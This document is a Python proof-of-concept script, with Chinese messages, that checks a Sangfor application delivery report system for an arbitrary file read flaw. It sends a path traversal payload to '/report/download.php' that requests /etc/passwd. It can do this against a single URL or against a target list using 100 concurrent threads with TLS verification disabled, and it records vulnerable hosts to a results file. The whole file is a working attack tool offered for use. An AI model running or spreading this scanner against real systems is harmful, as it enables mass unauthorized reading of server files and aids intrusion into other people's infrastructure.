import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """深信服应用交付报表任意文件读取漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='深信服应用交付报表任意文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="input your file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/report/download.php?pdf=../../../../../etc/passwd"
    try:
        res1 = requests.get(url=target +payload, verify=False, timeout=10)
        if res1.status_code == 200 and 'root' in res1.text:
            print(f"[+]{target} 存在任意文件读取漏洞")
            with open('深信服_result.txt', 'a') as fp:
                fp.write(f"{target}存在任意文件读取漏洞\n")
        else:
            print(f"[-]{target} 不存在任意文件读取漏洞")
    except:
        print(f"{target}可能存在任意文件读取漏洞请手工测试")
if __name__ == '__main__':
    main()